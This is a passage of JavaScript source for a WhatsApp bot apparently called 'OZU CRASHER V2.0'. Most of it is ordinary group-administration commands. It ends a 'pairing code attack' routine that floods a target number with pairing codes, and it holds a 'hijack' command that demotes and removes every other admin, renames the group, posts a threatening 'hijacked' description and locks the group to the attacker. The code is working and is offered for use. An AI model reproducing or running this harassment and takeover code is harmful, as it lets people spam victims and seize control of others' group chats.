                        text: `✅ *OZU PAIRING CODE ATTACK COMPLETED!*\n\n` +
                              `✅ Target: ${target}\n` +
                              `📈 Successfully Sent: \( {successCount}/ \){amount} codes\n\n` +
                              `☠️ The victim should have received all pairing codes by now.\n` +
                              `Good luck! 🔥` 
                    }, { quoted: m });
                }, 5000);

                setTimeout(() => sock.end(), 10000);
            }
        });

        sock.ev.on('creds.update', () => {});

    } catch (err) {
        console.error(err);
        await stillchasing.sendMessage(m.chat, { 
            text: `❌ Error: ${err.message || 'Unknown error'}` 
        }, { quoted: m });
    }

    break;
}
case "addadmin": {
    if (!m.isGroup) return Reply("❌ 𝗚𝗿𝗼𝘂𝗽 𝗖𝗵𝗮𝘁 𝗼𝗻𝗹𝘆");
    if (!isAdmins) return Reply("❌ 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗼𝗻𝗹𝘆");
 
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        forwardingScore: 99999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363361579058856@newsletter",
                            serverMessageId: 1,
                            newsletterName: "𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥 𝗩2.0 "
                        }
                    },
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: `
╔════════════════╗
║   👑 𝑨𝒅𝒎𝒊𝒏 𝑪𝒐𝒏𝒕𝒓𝒐𝒍
┃💥 𝗣𝗿𝗼𝗺𝗼𝘁𝗲
║👎 𝗗𝗲𝗺𝗼𝘁𝗲
┃🤝 𝗣𝗿𝗼𝗺𝗼𝘁𝗲𝗮𝗹𝗹
║🫴 𝗗𝗲𝗺𝗼𝘁𝗲𝗮𝗹𝗹
╚════════════════╝

⚡ 𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥  V2.0
👥 𝑮𝒓𝒐𝒖𝒑 𝑨𝒅𝒎𝒊𝒏 🛠️

𝑺𝒆𝒍𝒆𝒄𝒕 𝒂𝒏 𝒂𝒄𝒕𝒊𝒐𝒏 𝑻𝒐 𝑷𝒆𝒓𝒇𝒐𝒓𝒎 𝑩𝒚 𝑪𝒍𝒊𝒄𝒌𝒊𝒏𝒈 𝒂𝒏𝒚 𝑶𝒇 𝒕𝒉𝒆 𝑩𝒖𝒕𝒕𝒐𝒏:
`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴"
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "👑 𝗣𝗿𝗼𝗺𝗼𝘁𝗲",
                                    id: `${prefix}promote`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "⬇️ 𝗗𝗲𝗺𝗼𝘁𝗲",
                                    id: `${prefix}demote`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "👑 𝗣𝗿𝗼𝗺𝗼𝘁𝗲 𝗔𝗹𝗹",
                                    id: `${prefix}promoteall`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "⬇️ 𝗗𝗲𝗺𝗼𝘁𝗲 𝗔𝗹𝗹",
                                    id: `${prefix}demoteall`
                                })
                            }
                        ]
                    })
                })
            }
        }
    }, { quoted: lol });

    await stillchasing.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
case "demoteall": {
    if (!m.isGroup) return Reply("❌ 𝗚𝗿𝗼𝘂𝗽 𝗖𝗵𝗮𝘁 𝗼𝗻𝗹𝘆");
    if (!isAdmins) return Reply("❌ 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗼𝗻𝗹𝘆");
 
 
    let admins = groupMetadata.participants
        .filter(v => v.admin && v.id !== groupMetadata.owner)
        .map(v => v.id);

    if (admins.length < 1) return Reply("No admins to demote");

    await stillchasing.groupParticipantsUpdate(m.chat, admins, "demote");
    Reply(`⬇️ Demoted ${admins.length} admins`);
}
break;
case "promoteall": {
    if (!m.isGroup) return Reply("❌ 𝗚𝗿𝗼𝘂𝗽 𝗖𝗵𝗮𝘁 𝗼𝗻𝗹𝘆");
    if (!isAdmins) return Reply("❌ 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗼𝗻𝗹𝘆");
 
    let members = groupMetadata.participants
        .filter(v => !v.admin)
        .map(v => v.id);

    if (members.length < 1) return Reply("No members to promote");

    await stillchasing.groupParticipantsUpdate(m.chat, members, "promote");
    Reply(`👑 Promoted ${members.length} members`);
}
break;
case "demote": {
        if (!m.isGroup) return Reply("❌ 𝗚𝗿𝗼𝘂𝗽 𝗖𝗵𝗮𝘁 𝗼𝗻𝗹𝘆");
    if (!isAdmins) return Reply("❌ Admin only");
   
    let users = m.mentionedJid[0] || (q ? q.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null);
    if (!users) return Reply("𝗧𝗮𝗴 𝗮 𝘂𝘀𝗲𝗿 𝗼𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗺𝗲𝘀𝘀𝗮𝗴𝗲");

    await stillchasing.groupParticipantsUpdate(m.chat, [users], "demote");
    Reply("⬇️ 𝗨𝘀𝗲𝗿 𝗱𝗲𝗺𝗼𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆");
}
break;
case "promote": {
    if (!m.isGroup) return Reply("❌ 𝗚𝗿𝗼𝘂𝗽 𝗖𝗵𝗮𝘁 𝗼𝗻𝗹𝘆");
    if (!isAdmins) return Reply("❌ 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗼𝗻𝗹𝘆");
 
    let users = m.mentionedJid[0] || (q ? q.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null);
    if (!users) return Reply("𝗧𝗮𝗴 𝗮 𝘂𝘀𝗲𝗿 𝗼𝗿 𝗿𝗲𝗽𝗹𝘆 𝘁𝗼 𝗺𝗲𝘀𝘀𝗮𝗴𝗲");

    await stillchasing.groupParticipantsUpdate(m.chat, [users], "promote");
    Reply("👑 𝗨𝘀𝗲𝗿 𝗽𝗿𝗼𝗺𝗼𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆");
}
break;
case "opentime": {
    if (!m.isGroup) return;
    if (!isAdmins) return Reply("❌ 𝐀𝐝𝐦𝐢𝐧 𝐨𝐧𝐥𝐲");
    if (!q) return Reply("Example: .opentime 10s | 5m | 2h | 1d");

    let delay = parseTime(q);
    if (!delay) return Reply("❌ Invalid time format\nUse: s / m / h / d");

    Reply(`⏰ 𝐆𝐫𝐨𝐮𝐩 𝐰𝐢𝐥𝐥 𝐎𝐏𝐄𝐍 𝐢𝐧 *${q}*`);

    setTimeout(async () => {
        await stillchasing.groupSettingUpdate(m.chat, "not_announcement");
        Reply("🔓 𝐆𝐫𝐨𝐮𝐩 𝐢𝐬 𝐧𝐨𝐰 𝐎𝐏𝐄𝐍𝐄𝐃");
    }, delay);
}

break

case "linkgroup":
case "grouplink": {
if (!isGroup) return Reply(mess.group)
    if (!isAdmins) return Reply("🚫 Admin only");

    let code = await stillchasing.groupInviteCode(m.chat);

    Reply(`
╔══════════════════════╗
║   👥 𝑮𝑹𝑶𝑼𝑷 𝑳𝑰𝑵𝑲
╠══════════════════════╣
║ https://chat.whatsapp.com/${code}
╚══════════════════════╝
`);
}
break;
case "tagall": {
  if (!m.isGroup) return Reply("❌ Group only command")
  if (!isAdmins && !isCreator) return Reply("🚫 Admin only")

  // Fetch group metadata
  const groupMetadata = await stillchasing.groupMetadata(m.chat)
  const participants = groupMetadata.participants

  // Reason
  const reason = q ? q : "Important announcement"

  // Collect member IDs
  let members = participants.map(p => p.id)

  // Build mention text
  let text = `
╔════════════════════════════╗
║ 📢 𝗚𝗥𝗢𝗨𝗣 𝗧𝗔𝗚 𝗔𝗟𝗟
╠════════════════════════════╣
║ 👤 Tagged By : @${sender.split("@")[0]}
║ 📝 Reason   : ${reason}
║ 👥 Members  : ${members.length}
╠════════════════════════════╣
`

  members.forEach((user, i) => {
    text += `║ ${i + 1}. @${user.split("@")[0]}\n`
  })

  text += `╚════════════════════════════╝`

  // Send message
  await stillchasing.sendMessage(
    m.chat,
    {
      text,
      mentions: members.concat(m.sender) // include sender
    },
    { quoted: lol }
  )
}
break
// ================== HIDE TAG ==================
case "hidetag": {
  if (!m.isGroup) return Reply("❌ Group only command")
  if (!isAdmins && !isCreator) return Reply("❌ Admin only")
  if (!q) return Reply(`Example:\n${prefix + command} Important message here`)

  const groupMetadata = await stillchasing.groupMetadata(m.chat)
  const participants = groupMetadata.participants
  const members = participants.map(p => p.id)

  let text = `╔══════════════════════╗
║   👁️ *HIDDEN TAG*
╠══════════════════════╣
║ 👤 From : @${sender.split("@")[0]}
╠══════════════════════╣
${q}
╚══════════════════════╝`

  await stillchasing.sendMessage(
    m.chat,
    {
      text,
      mentions: members
    },
    { quoted: lol }
  )
}

break;
case "kick": {
if (!isGroup) return Reply(mess.group)
    if (!isAdmins) return Reply("🚫 Admin only");

    let users = m.mentionedJid;
    if (!users || users.length === 0)
        return Reply("🚫 Tag at least one user");

    let filtered = users.filter(u => u !== groupMetadata.owner);

    if (filtered.length === 0)
        return Reply("❌ Cannot kick group owner");

    await stillchasing.groupParticipantsUpdate(m.chat, filtered, "remove");

    Reply(`🚫 𝑼𝒔𝒆𝒓(𝒔) 𝑹𝒆𝒎𝒐𝒗𝒆𝒅 : ${filtered.length}`);
}

break

case "add": {
if (!isGroup) return Reply(mess.group)
if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")
    if (!isAdmins) return Reply("❌ Bot must be admin");
    if (!q) return Reply("➕ Example:\n.add 234xxxxxxxx");

    let nums = q.match(/\d{8,16}/g);
    if (!nums) return Reply("❌ Invalid number format");

    let users = nums.map(v => v + "@s.whatsapp.net");

    global.addQueue = global.addQueue || {};
    global.addQueue[m.chat] = users;

    let warnUI = `
╔════════════════════════════╗
║   ⚠️ 𝑨𝑫𝑫 𝑾𝑨𝑹𝑵𝑰𝑵𝑮
╠════════════════════════════╣
║ • Save the user's number
║ • Unsaved numbers may cause
║   WhatsApp restriction / ban
║
║ 👥 Numbers detected : ${users.length}
║
║ Are you sure you have saved
║ all numbers?
╚════════════════════════════╝
`;

    await stillchasing.sendMessage(m.chat, {
        text: warnUI,
        buttons: [
            { buttonId: "add_yes", buttonText: { displayText: "✅ YES, I HAVE SAVED" }, type: 1 },
            { buttonId: "add_cancel", buttonText: { displayText: "❌ CANCEL" }, type: 1 }
        ],
        headerType: 1,
        forwardingScore: 999,
        isForwarded: true
    }, { quoted: lol });
}
break;
case "add_yes": {
if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")

    let users = global.addQueue?.[m.chat];
    if (!users) return Reply("❌ No pending add request");

    await stillchasing.groupParticipantsUpdate(m.chat, users, "add");

    delete global.addQueue[m.chat];

    Reply(`
╔══════════════════════╗
║   ✅ 𝑨𝑫𝑫 𝑺𝑼𝑪𝑪𝑬𝑺𝑺
╠══════════════════════╣
║ 👥 Users Added : ${users.length}
║ 🔒 Safety Check : Passed
║ 🛡️ Ban Risk : Minimized
╚══════════════════════╝
`);
}
break;
case "add_cancel": {
    delete global.addQueue?.[m.chat];

    Reply(`
╔══════════════════════╗
║   ❌ 𝑨𝑫𝑫 𝑪𝑨𝑵𝑪𝑬𝑳𝑳𝑬𝑫
╠══════════════════════╣
║ No users were added
║ Action aborted safely
╚══════════════════════╝
`);
}

break
case "close": {
    if (!m.isGroup) return;
    if (!isAdmins) return Reply("❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆");

    await stillchasing.groupSettingUpdate(m.chat, "announcement");
    Reply("🔒 𝗚𝗿𝗼𝘂𝗽 𝗶𝘀 𝗻𝗼𝘄 𝗖𝗟𝗢𝗦𝗘𝗗");
}
break
case "open": {
    if (!m.isGroup) return;
    if (!isAdmins) return Reply("❌ 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆");

    await stillchasing.groupSettingUpdate(m.chat, "not_announcement");
    Reply("🔓 𝗚𝗿𝗼𝘂𝗽 𝗶𝘀 𝗻𝗼𝘄 𝗢𝗣𝗘𝗡");
}


break;

case "revoke": {
  if (!m.isGroup) return Reply("❌ *GROUP ONLY COMMAND*")
  if (!isAdmins && !isCreator) return Reply("❌ *ADMIN ONLY COMMAND*")

  try {
    await stillchasing.groupRevokeInvite(m.chat)

    const newLink = await stillchasing.groupInviteCode(m.chat)

    Reply(
`🔐 *GROUP LINK RESET SUCCESSFUL*

📛 Old invite link has been *PERMANENTLY DISABLED*

🔗 *NEW INVITE LINK*
https://chat.whatsapp.com/${newLink}

🛡️ Security status: *UPDATED*
`
    )
  } catch (err) {
    Reply("❌ Failed to revoke group invite link")
  }
}
break

case "setdesc": {
  if (!m.isGroup) return Reply("❌ *GROUP ONLY COMMAND*")
  if (!isAdmins && !isCreator) return Reply("❌ *ADMIN ONLY COMMAND*")
  if (!q) return Reply(`Example:\n${prefix + command} Group rules here`)

  try {
    const metadata = await stillchasing.groupMetadata(m.chat)
    const oldDesc = metadata.desc || "No description"

    await stillchasing.groupUpdateDescription(m.chat, q)

    Reply(
`📝 *GROUP DESCRIPTION UPDATED*

📌 *OLD DESCRIPTION*
${oldDesc}

🆕 *NEW DESCRIPTION*
${q}

✅ Update successful
`
    )
  } catch (err) {
    Reply("❌ Failed to update group description")
  }
}
break

case "setname": {
  if (!m.isGroup)
    return Reply("❌ This command can only be used in groups")
  if (!isAdmins && !isCreator) return Reply("❌ *ADMIN ONLY COMMAND*")
  if (!q) return Reply(`Example:\n${prefix + command} New group name`)

  try {
    const metadata = await stillchasing.groupMetadata(m.chat)
    const oldName = metadata.subject

    await stillchasing.groupUpdateSubject(m.chat, q)

    Reply(
`👑 *GROUP NAME UPDATED*

📛 *OLD NAME*
${oldName}

✨ *NEW NAME*
${q}

✅ Change applied successfully
`
    )
  } catch (err) {
    Reply("❌ Failed to update group name")
  }
}
break


case 'hijack': {
    // Owner check
    if (!isCreator) {
        return stillchasing.sendMessage(m.chat, { 
            text: "🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command" 
        }, { quoted: m });
    }

    let targetGroup = '';

    // Support for DM usage with group link or JID
    if (!m.isGroup) {
        if (!q) {
            return stillchasing.sendMessage(m.chat, { 
                text: `Usage in DM: ${prefix}hijack <group link or jid>\nExample: ${prefix}hijack https://chat.whatsapp.com/ABC123\n${prefix}hijack 120363407774461777@g.us` 
            }, { quoted: m });
        }

        if (q.includes('chat.whatsapp.com')) {
            try {
                const inviteCode = q.split('chat.whatsapp.com/')[1];
                const groupInfo = await stillchasing.groupGetInviteInfo(inviteCode);
                targetGroup = groupInfo.id;
            } catch (e) {
                return stillchasing.sendMessage(m.chat, { text: "❌ Invalid group link or unable to fetch group info." }, { quoted: m });
            }
        } else if (q.endsWith('@g.us')) {
            targetGroup = q.trim();
        } else {
            return stillchasing.sendMessage(m.chat, { text: "❌ Please send a valid WhatsApp group link or group JID." }, { quoted: m });
        }
    } else {
        targetGroup = m.chat;
    }

    try {
        // ── fetch fresh group metadata ───────────────────────────────
        const hjMeta      = await stillchasing.groupMetadata(targetGroup);
        const hjParts     = hjMeta.participants;
        const hjBotJid    = stillchasing.user.id.split(':')[0] + '@s.whatsapp.net';
        const hjSenderJid = m.sender;

        // ── step 1: find all admins except bot and sender (the connected user) ────────────
        const otherAdmins = hjParts.filter(p =>
            p.admin &&
            p.id !== hjBotJid &&           // Don't touch the bot itself
            p.id !== hjSenderJid           // Don't touch the user who connected the bot
        ).map(p => p.id);

        if (!otherAdmins.length) {
            return stillchasing.sendMessage(m.chat, { text: 'ℹ️ No other admins to remove in this group.' }, { quoted: m });
        }

        await stillchasing.sendMessage(m.chat, { 
            text: `⚡ *OZU HIJACK STARTED*\n🎯 ᴛᴀʀɢᴇᴛɪɴɢ ${otherAdmins.length} ᴀᴅᴍɪɴ(s)…` 
        }, { quoted: m });

        await stillchasing.sendMessage(targetGroup, { react: { text: '🔥', key: m.key } });

        // ── step 2: demote all other admins first ────────────────────
        try {
            await stillchasing.groupParticipantsUpdate(targetGroup, otherAdmins, 'demote');
        } catch (e) {
            console.error('[hijack] demote error:', e.message);
        }
        await sleep(1500);

        // ── step 3: kick the demoted admins ─────────────────────────
        let kicked = 0, failed = 0;
        const BATCH = 5;
        for (let i = 0; i < otherAdmins.length; i += BATCH) {
            const batch = otherAdmins.slice(i, i + BATCH);
            try {
                await stillchasing.groupParticipantsUpdate(targetGroup, batch, 'remove');
                kicked += batch.length;
            } catch (e) {
                failed += batch.length;
                console.error('[hijack] kick error:', e.message);
            }
            await sleep(1200);
        }

        // ── step 4: rename group ─────────────────────────────────────
        try {
            await stillchasing.groupUpdateSubject(targetGroup, 'ᴏᴢᴜ ᴄʀᴀsʜᴇʀ— ʙʏ ʙᴀᴅʙᴏɪ');
        } catch (_) {}

        // ── step 5: update description ───────────────────────────────
        try {
            await stillchasing.groupUpdateDescription(targetGroup,
`☠️ ᴏᴢᴜ ᴄʀᴀsʜᴇʀ ᴠ2 — ʜɪᴊᴀᴄᴋᴇᴅ ʙʏ ʙᴀᴅʙᴏɪ ☠️

ᴛʜɪs ɢʀᴏᴜᴘ ɪs ɴᴏᴡ ᴜɴᴅᴇʀ ᴏᴢᴜ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ.
ʀᴜʟᴇ ʙʏ ʙᴀᴅ ʙᴏɪ
ʀᴜʟᴇs ᴛᴏ ғᴏʟʟᴏᴡ ɪғ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʟɪᴠᴇ ʟᴏɴɢ ɪɴ.ᴛʜᴇ ɢʀᴏᴜᴘ
1. ɴᴏ ᴅɪsʀᴇsᴘᴇᴄᴛ ᴛᴏʟᴇʀᴀᴛᴇᴅ.
2. ɴᴏ ᴇxᴛᴇʀɴᴀʟ ʟɪɴᴋs ᴏʀ ɪɴᴠɪᴛᴇs.
3. ʙᴀᴅ ʙᴏɪ ɪs ᴀʟᴡᴀʏs ʀɪɢʜᴛ.

Telegram: t.me/badboistillchasing`
            );
        } catch (_) {}

        // ── step 6: lock to admins-only ──────────────────────────────
        try {
            await stillchasing.groupSettingUpdate(targetGroup, 'announcement');
        } catch (_) {}

        // ── step 7: promote sender (the connected user) to admin ───────────
        try {
            await stillchasing.groupParticipantsUpdate(targetGroup, [hjSenderJid], 'promote');
        } catch (_) {}

        // ── final report ─────────────────────────────────────────────
        await stillchasing.sendMessage(m.chat, { 
            text: `✅ *OZU HIJACK COMPLETE*\n\n` +
                  `🎯 ᴀᴅᴍɪɴs ᴛᴀʀɢᴇᴛᴇᴅ : ${otherAdmins.length}\n` +
                  `👊 sᴜᴄᴄᴇssғᴜʟʟʏ ᴋɪᴄᴋᴇᴅ : ${kicked}\n` +
                  `⚠️ ғᴀɪʟᴇᴅ : ${failed}\n` +
                  `🔒 ɢʀᴏᴜᴘ ʟᴏᴄᴋᴇᴅ (ᴀᴅᴍɪɴs)\n` +
                  `🛡️ ʏᴏᴜ (${hjSenderJid.split('@')[0]}) ᴀʀᴇ ɴᴏᴡ ᴛʜᴇ ᴍᴀɪɴ ᴀᴅᴍɪɴ.` 
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        await stillchasing.sendMessage(m.chat, { 
            text: `❌ ʜɪᴊᴀᴄᴋ ғᴀɪʟᴇᴅ: ${err.message || 'Unknown error'}` 
        }, { quoted: m });
    }

    break;
}
case "groupinfo":
case "gcinfo": {
  if (!m.isGroup) return Reply("❌ Group only command")

  const metadata = await stillchasing.groupMetadata(m.chat)
  const participants = metadata.participants

  const admins = participants.filter(p => p.admin)
  const members = participants.length

  const creator =
    metadata.owner
      ? `@${metadata.owner.split("@")[0]}`
      : "Unknown"

  const botId = stillchasing.user.id.split(":")[0] + "@s.whatsapp.net"
  const isBotAdmin = admins.some(a => a.id === botId)

  let invite = "Hidden (Admin only)"
  if (isAdmins || isCreator) {
    try {
      invite = await stillchasing.groupInviteCode(m.chat)
      invite = `https://chat.whatsapp.com/${invite}`
    } catch {}
  }

  let pp = null
  try {
    pp = await stillchasing.profilePictureUrl(m.chat, "image")
  } catch {
    pp = "https://i.ibb.co/8xYk6nq/group.png"
  }

  const adminList = admins
    .map(a => `• @${a.id.split("@")[0]}`)
    .join("\n")

  const dashboard = `
╔═══════════════════════╗
      👥 *GROUP INFO*
╚═══════════════════════╝

🏷 *Name:* ${metadata.subject}
🆔 *Group ID:* ${metadata.id}

👑 *Creator:* ${creator}
📅 *Created:* ${new Date(metadata.creation * 1000).toDateString()}

👥 *Members:* ${members}
🛡 *Admins:* ${admins.length}

🔐 *Group Mode:* ${metadata.announce ? "Admins Only" : "Everyone"}
🔒 *Locked:* ${metadata.locked ? "Yes" : "No"}
⏳ *Ephemeral:* ${metadata.ephemeralDuration
  ? metadata.ephemeralDuration / 86400 + " Days"
  : "Off"}

🤖 *Bot Admin:* ${isBotAdmin ? "Yes" : "No"}
🙋 *You Admin:* ${isAdmin ? "Yes" : "No"}

📝 *Description:*
${metadata.desc || "No description set"}

🔗 *Invite Link:*
${invite}

👑 *Admin List:*
${adminList || "None"}
`

  await stillchasing.sendMessage(
    m.chat,
    {
      image: { url: pp },
      caption: dashboard,
      mentions: admins.map(a => a.id).concat(metadata.owner ? [metadata.owner] : [])
    },
    { quoted: lol }
  )
}

break
case "broadcast-group":
case "bcgc": {
  if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")
  if (!q) return Reply("❌ Text required")

  let chats = await stillchasing.chats.all()
  let success = 0

  for (let chat of chats) {
    if (chat.id.endsWith("@g.us")) {
      await stillchasing.sendMessage(chat.id, { text: q })
      success++
    }
  }

  Reply(`
╔══════════════════════╗
║ 📢 GROUP BROADCAST
╠══════════════════════╣
║ 👥 Groups : ${success}
║ 🚀 Status : Success
╚══════════════════════╝
`)
}


break

case "left": {
  if (!m.isGroup)
    return Reply("❌ This command can only be used in groups")

  if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")

  try {
    const metadata = await stillchasing.groupMetadata(m.chat)
    const totalMembers = metadata.participants.length

    // Safely extract sender number
    const senderNumber = (typeof m.sender === 'string'
      ? m.sender
      : m.sender?.id || m.sender?.jid || ''
    ).split("@")[0]

    await Reply(
`╔════════════════════════════╗
║    🚪 𝑩𝑶𝑻 𝑳𝑬𝑨𝑽𝑰𝑵𝑮
╠════════════════════════════╣
║ 🏷️ Group  : ${metadata.subject}
║ 👥 Members: ${totalMembers}
║ 👑 By     : @${senderNumber}
║ 🕒 Time   : ${new Date().toLocaleString()}
╠════════════════════════════╣
║ ✅ Action Successful
║ 🤖 Bot is leaving the group
╚════════════════════════════╝
`
    )

    await new Promise(resolve => setTimeout(resolve, 2000))
    await stillchasing.groupLeave(m.chat)

  } catch (err) {
    console.error("Leave error:", err)
    Reply(`❌ Failed to leave group\n\nError: ${err.message}`)
  }

  break
}


break
case "kickall": {
  if (!m.isGroup) return Reply("❌ Group only command")
  if (!isAdmins && !isCreator) return Reply("🚫 Admin only")

  const chatId = m.chat

  // prevent double trigger
  if (kickAllConfirm.has(chatId)) {
    return Reply("⚠️ KickAll confirmation already pending.")
  }

  kickAllConfirm.set(chatId, {
    by: m.sender,
    time: Date.now()
  })

  await stillchasing.sendMessage(chatId, {
    text: `
╔════════════════════════════╗
║ ⚠️ 𝗞𝗜𝗖𝗞 𝗔𝗟𝗟 𝗖𝗢𝗡𝗙𝗜𝗥𝗠
╠════════════════════════════╣
║ 👤 Requested By:
║ @${sender.split("@")[0]}
╠════════════════════════════╣
║ 🚨 This will REMOVE:
║ • All Members
║ • All Admins
║ ❌ Except:
║ • Bot
║ • You
╠════════════════════════════╣
║ ❓ Proceed?
╚════════════════════════════╝
`,
    mentions: [sender],
    buttons: [
      { buttonId: "kickall_yes", buttonText: { displayText: "✅ YES, WIPE ALL" }, type: 1 },
      { buttonId: "kickall_no", buttonText: { displayText: "❌ NO, CANCEL" }, type: 1 }
    ],
    headerType: 1
  })
}


//=== Starting Owner Access Cases 

break
case "restart-bot":
case "restart": {
if (!isCreator)
    return Reply("🚫 *ACCESS DENIED*\n\n👑 Only the *Bot Creator or Owners* can use this command")

  Reply(`
╔══════════════════════╗
║ ♻️ BOT RESTARTING
╠══════════════════════╣
║ 🔄 Please wait...
╚══════════════════════╝
`)

  process.exit(0)
}

break
case "runtime": {
  await stillchasing.sendMessage(
    m.chat,
    {
      text:
        `
╔════════════════════╗
║    ⏱ 𝑹𝑼𝑵𝑻𝑰𝑴𝑬 🫠
║
║🕒 𝑼𝒑𝒕𝒊𝒎𝒆 :
*${runtime(process.uptime())}*
║🚀 𝑩𝒐𝒕 : 𝑹𝒖𝒏𝒏𝒊𝒏𝒈 𝑺𝒎𝒐𝒐𝒕𝒉
║🔋 𝑴𝒐𝒅𝒆 : ${stillchasing.public ? "𝑷𝒖𝒃𝒍𝒊𝒄 🌍" : "𝑺𝒆𝒍𝒇 🔒"}
║
╚════════════════════╝


`,
      buttons: [
        {
          buttonId: `${prefix}ping`,
          buttonText: { displayText: "🏓 P𝗶𝗻𝗴" },
          type: 1
        }
      ],
      footer: "𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴🔥",
      headerType: 1
    },
    { quoted: lol }
  );
}
break;
case "ping": {
  const start = Date.now();

  await stillchasing.sendMessage(
    m.chat,
    { text: "*🏓 P͜͡i͜͡n͜͡g͜͡i͜͡n͜͡g͜͡...*" },
    { quoted: lol }
  );

  const speed = Date.now() - start;

  await stillchasing.sendMessage(
    m.chat,
    {
      text:
        `
╔════════════════════╗
║      🏓 𝑷𝑰𝑵𝑮   
║⚡ 𝑺𝒑𝒆𝒆𝒅 : *${speed} ms*
║🤖 𝑩𝒐𝒕  : 𝑶𝒏𝒍𝒊𝒏𝒆 ✅
║🔥 𝑺𝒕𝒂𝒕𝒖𝒔 : 𝑺𝒕𝒂𝒃𝒍𝒆
╚════════════════════╝
`,
      buttons: [
        {
          buttonId: `${prefix}runtime`,
          buttonText: { displayText: "⏱ R𝘂𝗻𝘁𝗶𝗺𝗲" },
          type: 1
        }
      ],
      footer: "𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴 🔥",
      headerType: 1
    },
    { quoted: lol }
  );
}

break
case "help":
case "support": {

Reply(
`🆘 *HELP & SUPPORT CENTER*

Welcome to *𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴 Help Center* ⚡


If you experience any of the following:

• Bot not responding  
• Download errors  
• Command not working  
• Bug reports  
• Feature requests To add
• Bugs Not Sending🐞

━━━━━━━━━━━━━━━━━━
👑 *CONTACT CREATOR*
━━━━━━━━━━━━━━━━━━
📞 WhatsApp: wa.me/2349017593981
👤 Name    : 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴 

📌 _Please include:_
• Command used  
• Command to Add
• Screenshot (if possible)
• Clear explanation  

⚠️ _Spamming reports will be ignored._

© Powered by 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴
`
)

}
break;
case "addowner": {
  if (!isCreator)
    return Reply("O͜͡n͜͡l͜͡y͜͡ F͜͡o͜͡r͜͡ m͜͡y͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡ 👑");

  if (!args[0])
    return Reply(
      `_*I͜͡n͜͡c͜͡o͜͡r͜͡r͜͡e͜͡c͜͡t͜͡ U͜͡s͜͡a͜͡g͜͡e͜͡!*_\n\n` +
      `E͜͡x͜͡a͜͡m͜͡p͜͡l͜͡e͜͡:\n${prefix + command} 234xxxxxxxx`
    );

  const gun =
    q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const check = await stillchasing.onWhatsApp(gun);
  if (check.length === 0)
    return Reply(
      "*`S͜͡o͜͡r͜͡r͜͡y͜͡! N͜͡u͜͡m͜͡b͜͡e͜͡r͜͡ i͜͡s͜͡ n͜͡o͜͡t͜͡ r͜͡e͜͡g͜͡i͜͡s͜͡t͜͡e͜͡r͜͡e͜͡d͜͡ o͜͡n͜͡ W͜͡h͜͡a͜͡t͜͡s͜͡A͜͡p͜͡p͜͡!*"
    );

  if (owner.includes(gun))
